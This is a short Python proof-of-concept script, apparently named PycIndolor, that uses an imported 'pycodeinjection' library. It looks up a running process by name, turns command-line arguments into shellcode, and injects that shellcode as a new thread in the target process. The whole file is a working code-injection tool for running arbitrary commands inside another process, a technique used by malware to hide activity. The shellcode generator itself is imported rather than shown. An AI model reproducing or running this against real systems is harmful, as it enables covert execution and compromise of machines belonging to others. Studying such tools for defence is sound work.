#!/usr/bin/python
import sys
from pycodeinjection import *

def banner() :
	print("""
      |________|_____________________|_
      |        | | | | | | | | | | | | |________________
      |________|_P_y_c_I_n_d_o_l_o_r_|_|                
      |        |                   |

	Simple PoC for pycodeinjection library
	
	Proudly developed by Andrea Fortuna
	andrea@andreafortuna.org
	https://www.andreafortuna.org
""")

def usage():
	print ("python " + sys.argv[0] + " <process to inject> <commands to inject>")

banner()


if len(sys.argv) < 3:
    usage()
    sys.exit(0)

print ("* Search process " + sys.argv[1]) 
target_pid = getPID(sys.argv[1])
if target_pid == 0:
	print ("\tProcess " + sys.argv[1] + " non accessible...exiting!")
	sys.exit(0)

print ("* Process found, start injection...")
shellcode = generateShellcode(sys.argv[2])
if injectShellcode(target_pid, shellcode):
	print ("\tThread started!")
else:
	print ("\tInjection failed")
